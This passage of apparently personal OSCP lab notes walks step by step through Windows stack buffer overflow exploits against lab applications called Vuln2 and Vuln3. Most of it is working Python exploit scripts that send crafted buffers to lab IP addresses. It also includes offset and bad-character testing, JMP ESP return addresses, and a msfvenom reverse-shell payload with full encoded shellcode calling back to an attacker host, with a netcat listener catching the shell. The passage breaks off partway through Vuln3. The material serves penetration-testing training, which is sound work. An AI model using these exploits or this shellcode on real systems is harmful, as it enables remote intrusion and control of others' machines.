buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr"

try:
  print "\nSending evil buffer..."

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes with EIP 72433372
![54f2c915c17b2aa6116bb7bce5a83f75.png](f07176fa317648bd9d72d58f205d78e6.png)

Use msf-create_offset to determine the exact offset, which is at 2080
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ msf-pattern_offset -l 2096 -q 72433372
[*] Exact match at offset 2080
```

## Verify the offset
Adjust the variables in the exploit so that BBBB will be written to the EIP. 
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 3_verify_offset.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  # msf-pattern_offset -l 2096 -q 7243337
  filler = "A" * 2080
  eip = "B" * 4
  buffer = "C" * (2096 - len(filler) - len(eip))

  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```
Run the exploit and we see that it crashes with EIP 42424242. Sometimes the ESP has an offset when the app crashes. But in this case it does not have an offset. We see the C's are written immediately after the EIP. ESP is 34Aff88.
![1b6c8862380bc676499f9a74c79d434d.png](4e195e37ecef48afb2655e65df4243cf.png)


## Locate space for shellcode
We will use the technique of simply increasing the buffer size. Original buffer size is 2096. We will increase it to 2600.
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 4_placeholder_for_shellcode.py 
#!/usr/bin/python
import socket

# Try technique of just increasing the buffer

try:
  print "\nSending evil buffer..."

  # msf-pattern_offset -l 2096 -q 7243337
  filler = "A" * 2080
  eip = "B" * 4
  buffer = "D" * (2600 - len(filler) - len(eip))

  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes with EIP 42424242. However we see that only 12 bytes of the D's from the shellcode placeholder were written, and this is not enough space for a full shellcode.
![e930186369740604f3a0d8e5520e590a.png](7edf22c6dace4b7187bbf3f87be07bf7.png)

We notice that ECX may be a good candidate to hold shellcode. Use msf-nasm_shell to find an appropriate opcode to jump to ECX
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ msf-nasm_shell 
nasm > jmp ecx
00000000  FFE1              jmp ecx
nasm > 
```

Replace the first_stage variable in the exploit. Here it is:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 5_first_stage_shellcode.py 
#!/usr/bin/python
import socket

# Try technique of just increasing the buffer

try:
  print "\nSending evil buffer..."

  # msf-pattern_offset -l 2096 -q 7243337
  filler        = "A" * 2080
  eip           = "B" * 4
  first_stage   = "\xff\xe1" # JMP ECX -> ffe1
  nop_pad       = "\x90" * 10
  # buffer = "D" * (2600 - len(filler) - len(eip))

  inputBuffer = filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes at EIP 42424242.
![70e3f60a0e63809df0073a35ebc562b8.png](b3a862ca93024fda92f4277cd7a2aba0.png)

When we 'Follow in Dump' ESP, and can confirm that our JMP ECX op code (\xff\xe1) are in the data dump window.
![1d36930d9191b25f0e0e03031b44630b.png](fd3d3313f8764271b939c45c58b39342.png)


## Checking for bad characters
Bad chars = \x00\x3b\x45

Here is the script used to test for bad chars. You will see various strings for bad chars. The script will be run many times to test each string. I tested no more than 10 characters at one time because that was all the space we can use after specifying the opcode JMP ECX.
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 6_bad_chars.py 
#!/usr/bin/python
import socket

# For this exploit, the bad chars are: "\x07\x3b\x45\x8e"
badchars = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a"
badchars = "\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14"
badchars = "\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
badchars = "\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28"
badchars = "\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32"
badchars = "\x33\x34\x35\x36\x37\x38\x39\x3a\x3c"
badchars = "\x3d\x3e\x3f\x40\x41\x42\x43\x44\x46"
badchars = "\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars = "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
badchars = "\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64"
badchars = "\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e"
badchars = "\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
badchars = "\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
badchars = "\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
badchars = "\x8d\x8f\x90\x91\x92\x93\x94\x95\x96"
badchars = "\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars = "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
badchars = "\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
badchars = "\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe"
badchars = "\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8"
badchars = "\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
badchars = "\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
badchars = "\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6"
badchars = "\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars = "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa"
badchars = "\xfb\xfc\xfd\xfe\xff\x90\x90\x90\x90\x90" 

try:
  print "\nSending evil buffer..."

  # msf-pattern_offset -l 2096 -q 7243337
  filler        = "A" * 2080
  eip           = "B" * 4
  first_stage   = "\xff\xe1" # JMP ECX -> ffe1

  inputBuffer = filler + eip + first_stage + badchars

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

## Find a Return Address
Run `!mona modules`. We see that only VulnApp2.exe runs with  security features. It also has a good base address which does not contain bad chars.
![eab7d38ea33a0e9458b1413b20251610.png](8de57f1ef4ae40cc8b7e156009d85d6b.png)

Look for a naturally occurring JMP ESP instruction in VulnApp2.exe. First use msf-nasm_shell to get the op code
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 
```
Now search using mona by inputting `!mona find -s "\xff\xe4" -m "Vuln2App2.exe"`. We find one pointer at 0x1480113d
![e845a2ca5ae6e223fad7eb5930632b23.png](24751a850c5b4d1686f3c1eb2f4d273a.png)

We confirm that it is a JMP ESP instruction at 0x1480013d
![f3d920f939a84c23a652255dbd530e06.png](2e94dc101f40495689b7bf195b3865aa.png)

Update the exploit so that EIP is 0x1480113d
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 7_find_return_address.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler        = "A" * 2080
  eip           = "\x3d\x11\x80\x14" # 0x1480113d
  first_stage   = "\xff\xe1" # JMP ECX -> ffe1
  nop_pad       = "\x90" * 10
  # buffer = "D" * (2600 - len(filler) - len(eip))

  inputBuffer = filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Place a breakpoint at the JMP ESP 0x1480013d
![a3f4e74894238c861647a4912c1e0c7e.png](5223056b466d44f2a82fad337fa60662.png)

Run the poc again. We hit the breakpoint EIP is 0x1480013d
![c17a27ed2d72c831817460d6621cae9d.png](4d810aed1da947f2b1e0c06a7d1278ff.png)

Single-step by pressing F7, and we get to JMP ECX instruction
![b3887439d50c11cd244a52f3f222eaa2.png](c32e9fac29144290bc0549c27c5d926d.png)

Press F7 again and we see a bunch of A's. This is where we can put our full shellcode.
![eb1c5cfc37f907d6311715c611881194.png](3694f238546f4d62a9c5100ac6c480ed.png)



## Generate shellcode
Generate shellcode, be sure to account for bad characters
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\x3b\x45"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\x90\xed\x90\xfb\xdb\xd9\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xef\xfc\x31\x57\x0e\x03\xc7\xe3\x72\x0e\x1b\x13\xf0"
"\xf1\xe3\xe4\x95\x78\x06\xd5\x95\x1f\x43\x46\x26\x6b\x01\x6b"
"\xcd\x39\xb1\xf8\xa3\x95\xb6\x49\x09\xc0\xf9\x4a\x22\x30\x98"
"\xc8\x39\x65\x7a\xf0\xf1\x78\x7b\x35\xef\x71\x29\xee\x7b\x27"
"\xdd\x9b\x36\xf4\x56\xd7\xd7\x7c\x8b\xa0\xd6\xad\x1a\xba\x80"
"\x6d\x9d\x6f\xb9\x27\x85\x6c\x84\xfe\x3e\x46\x72\x01\x96\x96"
"\x7b\xae\xd7\x16\x8e\xae\x10\x90\x71\xc5\x68\xe2\x0c\xde\xaf"
"\x98\xca\x6b\x2b\x3a\x98\xcc\x97\xba\x4d\x8a\x5c\xb0\x3a\xd8"
"\x3a\xd5\xbd\x0d\x31\xe1\x36\xb0\x95\x63\x0c\x97\x31\x2f\xd6"
"\xb6\x60\x95\xb9\xc7\x72\x76\x65\x62\xf9\x9b\x72\x1f\xa0\xf3"
"\xb7\x12\x5a\x04\xd0\x25\x29\x36\x7f\x9e\xa5\x7a\x08\x38\x32"
"\x7c\x23\xfc\xac\x83\xcc\xfd\xe5\x47\x98\xad\x9d\x6e\xa1\x25"
"\x5d\x8e\x74\xe9\x0d\x20\x27\x4a\xfd\x80\x97\x22\x17\x0f\xc7"
"\x53\x18\xc5\x60\xf9\xe3\x8e\x4e\x56\x9c\x98\x27\xa5\x62\x24"
"\x03\x20\x84\x4c\x63\x65\x1f\xf9\x1a\x2c\xeb\x98\xe3\xfa\x96"
"\x9b\x68\x09\x67\x55\x99\x64\x7b\x02\x69\x33\x21\x85\x76\xe9"
"\x4d\x49\xe4\x76\x8d\x04\x15\x21\xda\x41\xeb\x38\x8e\x7f\x52"
"\x93\xac\x7d\x02\xdc\x74\x5a\xf7\xe3\x75\x2f\x43\xc0\x65\xe9"
"\x4c\x4c\xd1\xa5\x1a\x1a\x8f\x03\xf5\xec\x79\xda\xaa\xa6\xed"
"\x9b\x80\x78\x6b\xa4\xcc\x0e\x93\x15\xb9\x56\xac\x9a\x2d\x5f"
"\xd5\xc6\xcd\xa0\x0c\x43\xfd\xea\x0c\xe2\x96\xb2\xc5\xb6\xfa"
"\x44\x30\xf4\x02\xc7\xb0\x85\xf0\xd7\xb1\x80\xbd\x5f\x2a\xf9"
"\xae\x35\x4c\xae\xcf\x1f";
```

Get a reverse shell
Update the code to include the shellcode:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 8_add_shellcode_yes_nops.py 
#!/usr/bin/python
import socket

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\x3b\x45"
shellcode = ("\xba\x90\xed\x90\xfb\xdb\xd9\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xef\xfc\x31\x57\x0e\x03\xc7\xe3\x72\x0e\x1b\x13\xf0"
"\xf1\xe3\xe4\x95\x78\x06\xd5\x95\x1f\x43\x46\x26\x6b\x01\x6b"
"\xcd\x39\xb1\xf8\xa3\x95\xb6\x49\x09\xc0\xf9\x4a\x22\x30\x98"
"\xc8\x39\x65\x7a\xf0\xf1\x78\x7b\x35\xef\x71\x29\xee\x7b\x27"
"\xdd\x9b\x36\xf4\x56\xd7\xd7\x7c\x8b\xa0\xd6\xad\x1a\xba\x80"
"\x6d\x9d\x6f\xb9\x27\x85\x6c\x84\xfe\x3e\x46\x72\x01\x96\x96"
"\x7b\xae\xd7\x16\x8e\xae\x10\x90\x71\xc5\x68\xe2\x0c\xde\xaf"
"\x98\xca\x6b\x2b\x3a\x98\xcc\x97\xba\x4d\x8a\x5c\xb0\x3a\xd8"
"\x3a\xd5\xbd\x0d\x31\xe1\x36\xb0\x95\x63\x0c\x97\x31\x2f\xd6"
"\xb6\x60\x95\xb9\xc7\x72\x76\x65\x62\xf9\x9b\x72\x1f\xa0\xf3"
"\xb7\x12\x5a\x04\xd0\x25\x29\x36\x7f\x9e\xa5\x7a\x08\x38\x32"
"\x7c\x23\xfc\xac\x83\xcc\xfd\xe5\x47\x98\xad\x9d\x6e\xa1\x25"
"\x5d\x8e\x74\xe9\x0d\x20\x27\x4a\xfd\x80\x97\x22\x17\x0f\xc7"
"\x53\x18\xc5\x60\xf9\xe3\x8e\x4e\x56\x9c\x98\x27\xa5\x62\x24"
"\x03\x20\x84\x4c\x63\x65\x1f\xf9\x1a\x2c\xeb\x98\xe3\xfa\x96"
"\x9b\x68\x09\x67\x55\x99\x64\x7b\x02\x69\x33\x21\x85\x76\xe9"
"\x4d\x49\xe4\x76\x8d\x04\x15\x21\xda\x41\xeb\x38\x8e\x7f\x52"
"\x93\xac\x7d\x02\xdc\x74\x5a\xf7\xe3\x75\x2f\x43\xc0\x65\xe9"
"\x4c\x4c\xd1\xa5\x1a\x1a\x8f\x03\xf5\xec\x79\xda\xaa\xa6\xed"
"\x9b\x80\x78\x6b\xa4\xcc\x0e\x93\x15\xb9\x56\xac\x9a\x2d\x5f"
"\xd5\xc6\xcd\xa0\x0c\x43\xfd\xea\x0c\xe2\x96\xb2\xc5\xb6\xfa"
"\x44\x30\xf4\x02\xc7\xb0\x85\xf0\xd7\xb1\x80\xbd\x5f\x2a\xf9"
"\xae\x35\x4c\xae\xcf\x1f")

try:
  print "\nSending evil buffer..."
  nop_sled = "\x90" * 64
  filler        = "A" * (2080 - len(nop_sled) - len(shellcode))
  eip           = "\x3d\x11\x80\x14" # 0x1480113d
  first_stage   = "\xff\xe1" # JMP ECX -> ffe1
  nop_pad       = "\x90" * 10

  inputBuffer = nop_sled + shellcode + filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Open a netcat listner on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 443
[sudo] password for kali: 
listening on [any] 443 ...
```

Run Vuln2App.exe but do not open Immunity.
![c991177a190ab482b2af93965154504a.png](92fcdde28dda4ca1b83215cce01a6574.png)

We've caught a shell in Kali
![d806a0780ea7ebc3d23880b477657da9.png](35e150f417654e0691a161407383760f.png)



# Vuln3

## The original poc:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow$ cat Vuln3_poc.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "A" * 0x8B0

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.176.227", 7003))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

## Crash the app
Modify the poc to include the Widow client's IP address. I tried fuzzing for buffer length 1-10000. Turns out the problem isn't the buffer length, it's the 'A' character! Try using B's instead. Here is the script:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ cat 1_poc.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "B" * 2224 # x8b0

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashed with EIP 14801029. Notice that EDI and ESI both write B's to those registers.
![eb43da276f7026da3aed283017123e43.png](a2ebf4dbc2f648b4851215a1f50cf3e7.png)

Fuzzing with B's didn't work either. I could only send one payload per script. Buffer value 2084 will write EIP 42424242.
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ cat 1_poc.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "B" * 2084 # x8b0 2224

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

## Find space for first stage shellcode
We will verify the crash and use the technique of increasing our buffer.
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ cat 2_verify_offset.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler = "B" * 2080
  eip = "Y" * 4
  buffer = "Z" * (2100 - len(filler) - len(eip))
  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes at EIP 59595959 (the Y's), and we see that EDX looks like a good place to put shellcode. Or is it... the address may not be good.

Get the opcode for JMP EDX
```plaintext
kali@kali:~$ msf-nasm_shell 
nasm > jmp edx
00000000  FFE2              jmp edx
nasm > 
```

Modify the code to replace the stack pointer to point to EDX.
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ cat 3_first_stage_shellcode.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler = "B" * 2080
  eip = "Y" * 4
  first_stage = "\xff\xe2"  # JMP EDX -> ffe2
  nop_pad  = "\x90" * (2100 - len(filler) - len(eip) - len(first_stage))
  inputBuffer = filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes at EIP 59595959 and ESP at 03D3FF88
![3635f04663a619c0bcb83a1acde2ff87.png](fd17833fb99646db8c3e2e90b8e9a97d.png)

We also confirm we see the JMP EDX code when we follow ESP 03D3FF88 in dump.
![eb8e55b2eadf234c2c7fb6356891aad2.png](80e1beb42dd5413c852f3ae05dde32ec.png)


# Identify bad characters
Bad chars are: **\x00\xc5**
The following script was used to check for bad characters, 14 characters at a time. We Follow in Dump the ESP and see if each character is there in the right sequence. If not, we know the bad character is the one not in sequence. Or sometimes the app crashes in a way that we can't follow the ESP at all
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ cat 4_bad_chars.py 
#!/usr/bin/python
import socket

# Bad chars in this script are: \x00\xc5
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e"
badchars = "\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c"
badchars = "\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a"
badchars = "\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38"
badchars = "\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46"
badchars = "\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54"
badchars = "\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
badchars = "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars = "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e"
badchars = "\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
badchars = "\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a"
badchars = "\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
badchars = "\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
badchars = "\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4"
badchars = "\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
badchars = "\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars = "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee"
badchars = "\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc"
badchars = "\xfd\xfe\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 

try:
  print "\nSending evil buffer..."

  filler = "B" * 2080
  eip = "Y" * 4
  first_stage = "\xff\xe2"  # JMP EDX -> ffe2
  nop_pad  = "\x90" * (2100 - len(filler) - len(eip) - len(first_stage))
  inputBuffer = filler + eip + first_stage + badchars

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

## Find a return address
When running `!mona modules` we see that Vuln3App.exe is the only module running with security features disabled.
![8b35806b1bd4580d358b8af5a1fd8f12.png](c5ad0596fbf54927b0798e834412b1af.png)

Look for the op instruction code for JMP ESP
```plaintext
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 
```

We will look for a naturally occurring JMP ESP address within the Vuln3App.exe module. 
Run `!mona find -s "\xff\xe4" -m "VulnApp3.exe"`
We see that 1 pointer is found at address 0x1480111e, and we replace the EIP variable in the script with the address
![320bcd54d4fde4a5f695b90a1b290778.png](dd1517416e93452db3e7b61733ddbe50.png)

Here is the script with the eip variable updated to 0x1480111e
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ cat 5_find_return_address.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler = "B" * 2080
  eip = "\x1e\x11\x80\x14" # 0x1480111e
  first_stage = "\xff\xe2"  # JMP EDX -> ffe2
  nop_pad  = "\x90" * (2100 - len(filler) - len(eip) - len(first_stage))
  inputBuffer = filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Before running the exploit, confirm there is a JMP ESP at 0x1480111e then set a breakpoint on it.
![5ecbff4bca62282ac02029d89c73f62e.png](4091578dcfbe4deb96b808375711308a.png)

Run the exploit. Confirm that we hit the breakpoint.
![ac497b04140f562ba56b916b265fa31a.png](687c4bfce74e4594be6808a18ce557bc.png)

Single-step by pressing F7. We see we are at the JMP EDX code.
